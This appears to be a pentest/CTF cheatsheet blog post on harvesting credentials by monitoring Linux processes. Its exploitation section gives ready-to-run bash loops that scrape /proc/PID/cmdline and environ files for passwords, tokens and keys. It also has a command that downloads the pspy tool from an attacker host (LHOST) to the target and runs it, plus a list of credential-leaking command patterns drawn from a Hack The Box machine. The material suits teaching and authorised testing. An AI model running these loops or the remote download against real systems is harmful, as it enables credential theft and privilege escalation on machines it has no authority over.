---
title: "Process Monitoring for Credential Harvesting"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Process Monitoring for Credential Harvesting"
summary: "PrivEsc | Process Monitoring for Credential Harvesting"
tags:
  - "Privilege Escalation"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PrivEsc"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Context
Cron jobs, systemd services, and scripts often pass credentials as command-line arguments. These are visible in `/proc/PID/cmdline` for the (brief) duration of the process execution. A fast polling loop can capture them.

## Detection
```bash
# Check for cron jobs / timers
systemctl list-timers --all
crontab -l
ls -la /etc/cron* /var/spool/cron/
journalctl -u '*cleanup*' --no-pager -n 20

# Check for scripts owned by interesting users
find /opt /usr/local -type f -name "*.sh" -ls 2>/dev/null

# Check systemd services
systemctl list-units --type=service --all
```

## Exploitation

### Basic /proc cmdline monitor (all processes)
```bash
while true; do
  for f in /proc/[0-9]*/cmdline; do
    cmd=$(tr '\0' ' ' < "$f" 2>/dev/null)
    [ -n "$cmd" ] && echo "$cmd"
  done
done 2>/dev/null | sort -u | tee /tmp/procs.log
```

### Monitor specific UID only
```bash
TARGET_UID=1638400000  # e.g., IPA admin user

while true; do
  for d in /proc/[0-9]*/; do
    if [ -r "${d}cmdline" ] 2>/dev/null; then
      uid=$(awk '/^Uid:/{print $2}' "${d}status" 2>/dev/null)
      if [ "$uid" = "$TARGET_UID" ]; then
        cmd=$(tr '\0' ' ' < "${d}cmdline" 2>/dev/null)
        [ -n "$cmd" ] && echo "$(date +%H:%M:%S) $cmd"
      fi
    fi
  done
done 2>/dev/null | sort -u | tee /tmp/target_procs.log
```

### Using pspy (recommended for CTF)
```bash
# Transfer pspy to target
wget http://LHOST/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 100  # poll every 100ms, show file events too
```

### Monitor /proc/PID/environ (if readable)
```bash
# Some processes have readable environ files
for d in /proc/[0-9]*/; do
  env=$(tr '\0' '\n' < "${d}environ" 2>/dev/null)
  if echo "$env" | grep -qi 'pass\|secret\|token\|key'; then
    echo "=== PID: $(basename $d) ==="
    echo "$env" | grep -i 'pass\|secret\|token\|key'
  fi
done
```

## What to Look For
- `ipa user-mod --setattr userPassword=...` (FreeIPA password resets)
- `mysql -u root -pPASSWORD` (MySQL credentials in CLI)
- `curl -u user:pass` (HTTP basic auth)
- `sshpass -p PASSWORD` (SSH automation)
- `kinit --password-file=...` or `echo PASSWORD | kinit` (Kerberos)
- `ldapmodify -w PASSWORD` (LDAP operations)
- Environment variables with credentials in `/proc/PID/environ`

## Key Notes
- `/proc/PID/cmdline` is world-readable by default on Linux (unless `hidepid=2` mount option)
- Short-lived processes may be missed - run the loop as tight as possible
- `pspy` uses inotify and is more reliable than polling
- Cron jobs typically run every N minutes - check `systemctl list-timers` for timing
- Consider also monitoring `/proc/PID/environ` for env-based credentials

## Seen In
- HTB Sorcery (Insane): rebecca_smith monitoring cleanup.service (admin user) to capture `ipa user-mod ash_winter --setattr userPassword=...`
